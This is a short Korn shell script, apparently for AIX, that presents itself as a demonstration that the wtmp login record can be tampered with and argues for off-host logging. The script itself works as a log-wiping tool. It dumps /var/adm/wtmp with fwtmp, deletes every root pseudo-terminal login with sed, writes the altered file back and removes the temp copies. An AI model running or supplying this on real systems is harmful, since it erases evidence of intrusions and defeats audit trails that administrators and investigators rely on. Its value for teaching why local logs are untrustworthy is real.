#!/usr/bin/ksh

##This script was created to demostrate how wtmp could be modified and is not a
# file that can be trusted on the local host.  The sed command could be
# manipulated in such a way to remove any logins to the host.
# From a security perspective it is best to trap access outside of the host.
# That way a second layer of protection is enforced. 

#Make a temp copy of the wtmp
/usr/sbin/acct/fwtmp < /var/adm/wtmp >/tmp/out

#Remove entries with Psuedo Terminal Access
sed '/^root.*pts/d' /tmp/out > /tmp/out.after

#replace
/usr/sbin/acct/fwtmp -ic < /tmp/out.after > /var/adm/wtmp

#Delete temp files
rm /tmp/out
rm /tmp/out.after
